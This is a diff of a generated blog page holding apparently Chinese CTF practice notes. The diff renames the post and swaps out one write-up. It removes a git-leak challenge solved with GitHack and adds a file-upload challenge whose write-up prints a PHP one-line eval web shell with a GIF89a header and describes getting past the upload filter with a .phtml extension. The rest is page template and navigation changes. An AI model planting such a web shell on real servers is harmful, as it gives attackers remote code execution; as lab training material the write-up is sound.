@@ -4,7 +4,7 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="Buuctf笔记, ECNU NLP DeepLearning AntNLP 杨云凯 网络安全 深度学习 ">
+    <meta name="keywords" content="Buuctf之Web, ECNU NLP DeepLearning AntNLP 杨云凯 网络安全 深度学习 ">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
@@ -20,7 +20,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Buuctf笔记 | 网安小白</title>
+    <title>Buuctf之Web | 网安小白</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -319,13 +319,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/30.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Buuctf笔记
+                        Buuctf之Web
                     </div>
                 </div>
             </div>
@@ -440,8 +440,8 @@
                             <span class="chip bg-color">buuctf</span>
                         </a>
                         
-                        <a href="/tags/web入门/" target="_blank">
-                            <span class="chip bg-color">web入门</span>
+                        <a href="/tags/web/" target="_blank">
+                            <span class="chip bg-color">web</span>
                         </a>
                         
                     </div>
@@ -464,7 +464,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-12-21
+                    2021-01-15
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -702,22 +702,18 @@ array(6) {
 <p>base64得：</p>
 <pre><code>&lt;?php
 echo &quot;Can you find out the flag?&quot;;
-//flag{31296a5e-f4b3-4e65-890a-98c66a1e91b4}</code></pre><h1 id="N1book"><a href="#N1book" class="headerlink" title="N1book"></a>N1book</h1><h2 id="第一章-web入门"><a href="#第一章-web入门" class="headerlink" title="[第一章 web入门]"></a>[第一章 web入门]</h2><h3 id="粗心的小李"><a href="#粗心的小李" class="headerlink" title="粗心的小李"></a>粗心的小李</h3><p>题目：</p>
-<p>Git测试</p>
-<p>Hello, CTFer!</p>
-<p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p>
-<hr>
-<p>小李好像不是很小心，经过了几次迭代更新就直接就把整个文件夹放到线上环境了:(</p>
-<p>very easy</p>
-<p>看网上说这是git测试，听别人看书说要用一个工具叫：scrabble，但是我没有书，所以我就不和他用一样的工具：Githack</p>
-<p>kali没有自己下载：</p>
-<pre><code>git clone https://github.com/BugScanTeam/GitHack
-cd GitHack
-python GitHack.py http://24015196-5385-41b6-9b92-02d1bdc92971.node3.buuoj.cn/.git</code></pre><p>然后就发现<img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A50926_2.png" alt></p>
-<p>打开以后</p>
-<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A50927_3.png" alt></p>
-<p>n1book{git_looks_s0_easyfun}</p>
-<p>完事了</p>
+//flag{31296a5e-f4b3-4e65-890a-98c66a1e91b4}</code></pre><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>小马：</p>
+<pre><code>GIF89a
+&lt;?php @eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>首先上传.php文件发现对后缀进行了限制</p>
+<p>改为shell.php.png同时抓包删除png</p>
+<p>得到一个页面以后查看源代码发现：</p>
+<p>Upload Success! Look here~ ./uplo4d/3d694425bf5c9803db0c7b3d776cd2f1.png</p>
+<p>发现确实存在，但是被重命名了，而且变成了一个png</p>
+<p>重新尝试后缀绕过shell.phtml（通过抓包修改）</p>
+<p>得到：</p>
+<p>Upload Success! Look here~ ./uplo4d/bd914ca4997d34857501cefab0064162.phtml</p>
+<p>回到根目录查看flag即可</p>
+<p>或者数据终端cat /flag</p>
 
             </div>
             <hr />
@@ -876,9 +872,9 @@ python GitHack.py http://24015196-5385-41b6-9b92-02d1bdc92971.node3.buuoj.cn/.gi
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《Buuctf笔记》
+                    《Buuctf之Web》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/12/21/buuctf-bi-ji/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2021/01/15/buuctf-zhi-web/" property="cc:attributionName"
                rel="cc:attributionURL">
                 杨云凯
             </a> 采用
@@ -919,7 +915,7 @@ python GitHack.py http://24015196-5385-41b6-9b92-02d1bdc92971.node3.buuoj.cn/.gi
         repo: 'iceberg404.github.io',
         owner: 'iceberg404',
         admin: "godweiyang",
-        id: '2020/12/21/buuctf-bi-ji/',
+        id: '2021/01/15/buuctf-zhi-web/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -1202,33 +1198,90 @@ python GitHack.py http://24015196-5385-41b6-9b92-02d1bdc92971.node3.buuoj.cn/.gi
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/12/23/ctfhub-sui-bi/">
+                <a href="/2021/01/15/buuctf-zhi-web/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="CtfHub随笔">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="Buuctf之Web">
                         
-                        <span class="card-title">CtfHub随笔</span>
+                        <span class="card-title">Buuctf之Web</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            WebWeb前置技能HTTP协议请求方式题目：
-
-HTTP Method is GET
-Use CTF**B Method, I will give you flag.
-Hint: If you got 「HTTP Method Not A
+                            WEB第一题:[HCTF 2018]WarmUp这里懒得上传图片了，所以就直接笔记了
+源代码里面有1.source.php，所以打开以后还会发先2.hint.php
+1打开后会发现是代码审计
+&lt;?php
+    highlight_f
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-23
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-01-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/buuctf/" target="_blank">
+                        <span class="chip bg-color">buuctf</span>
+                    </a>
+                    
+                    <a href="/tags/web/" target="_blank">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/01/15/buuctf-zhi-misc/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="Buuctf之Misc">
+                        
+                        <span class="card-title">Buuctf之Misc</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            2021/1/15二维码下载得到QR_code.png图片，扫码得到secret is here，但并非flag。
+但是这个图片的大小却是600多个kb，所以怀疑是压缩包文件，改个后缀zip打开发现有密码
+因为文件名字是4number所以爆
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-01-15
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -1244,67 +1297,12 @@ Hint: If you got 「HTTP Method Not A
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/入门/" target="_blank">
-                        <span class="chip bg-color">入门</span>
+                    <a href="/tags/buuctf/" target="_blank">
+                        <span class="chip bg-color">buuctf</span>
                     </a>
                     
-                    <a href="/tags/ctfhub/" target="_blank">
-                        <span class="chip bg-color">ctfhub</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/12/19/lampiao-shen-tou-chu-tan/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/39.jpg" class="responsive-img" alt="lampiao渗透测试初探">
-                        
-                        <span class="card-title">lampiao渗透测试初探</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            lampiao靶机渗透测试笔记简单介绍：Would you like to keep hacking in your own lab?
-
-Try this brand new vulnerable machine! &quot;Lampiã
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-19
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/渗透测试/" class="post-category" target="_blank">
-                                    渗透测试
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/入门/" target="_blank">
-                        <span class="chip bg-color">入门</span>
-                    </a>
-                    
-                    <a href="/tags/靶机/" target="_blank">
-                        <span class="chip bg-color">靶机</span>
+                    <a href="/tags/misc/" target="_blank">
+                        <span class="chip bg-color">misc</span>
                     </a>
                     
                 </div>
@@ -1478,7 +1476,7 @@ Try this brand new vulnerable machine! &quot;Lampiã
 
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">35.2k</span>
+            <span class="white-color">36k</span>
             
 
             <br>
